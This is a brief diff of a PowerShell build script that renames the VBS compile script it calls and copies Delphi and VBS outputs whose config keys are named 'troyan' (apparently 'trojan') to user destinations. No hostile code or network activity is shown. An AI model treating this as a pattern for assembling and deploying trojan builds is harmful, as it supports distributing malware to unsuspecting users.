@@ -44,7 +44,7 @@ Copy-Item -Path $server.troyanDelphiExe -Destination $server.userDelphiExe -Forc
 
 
 #precompileVBS
-& (Join-Path -Path $server.troyanVbsDir -ChildPath "./compile.ps1") -serverName $serverName
+& (Join-Path -Path $server.troyanVbsDir -ChildPath "./vbscompile.ps1") -serverName $serverName
 Copy-Item -Path $server.troyanVbsFile -Destination $server.userVbsFile -Force
 
 
